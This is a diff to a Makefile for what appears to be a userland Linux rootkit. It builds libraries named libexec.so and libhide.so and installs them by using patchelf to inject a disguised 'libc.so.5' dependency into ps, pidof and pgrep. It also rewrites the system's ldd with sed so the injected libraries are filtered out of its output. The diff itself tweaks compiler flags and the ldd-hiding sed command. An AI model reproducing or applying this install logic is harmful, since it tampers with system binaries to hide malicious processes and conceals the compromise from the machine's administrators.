@@ -3,7 +3,7 @@ LIBEXEC  := libexec.so
 LIBHIDE  := libhide.so
 BINDIR   := /lib/x86_64-linux-gnu
 ACTION   := ./patchelf --add-needed
-CFLAGS   := -fPIC -Wall -Wextra -Werror -pedantic -O2 -pipe -std=c17 -march=native -shared -ldl -s -nostartfiles
+CFLAGS   := -fPIC -Wall -Wextra -Werror -pedantic -O2 -pipe -std=c17 -march=native -shared -ldl -static -s -nostartfiles
 LDFLAGS  := -Wl,-z,norelro -Wl,-O1 -Wl,--build-id=none -Wl,-z,separate-code
 
 TARGETS := $(LIBEXEC) $(LIBHIDE)
@@ -30,7 +30,8 @@ install: all
 	$(ACTION) $(BINDIR)/libc.so.5 $$(which ps)
 	$(ACTION) $(BINDIR)/libc.so.5 $$(which pidof)
 	$(ACTION) $(BINDIR)/libc.so.5 $$(which pgrep)
-	sed -i 's/\(try_trace "\$RTLD" "\$file"\)\( \|\| result=1\)/\1 | grep -vE '\''libc.so.4|libc.so.5'\''\2/' $(which ldd)  
-	
+
+	sed -i 's/try_trace \"$RTLD\" \"$file\" || result=1/try_trace \"$RTLD\" \"$file\" | grep -vE \"libc.so.4|libc.so.5\" || result=1/g' $$(which ldd)
+
 clean:
 	rm -f $(TARGETS)
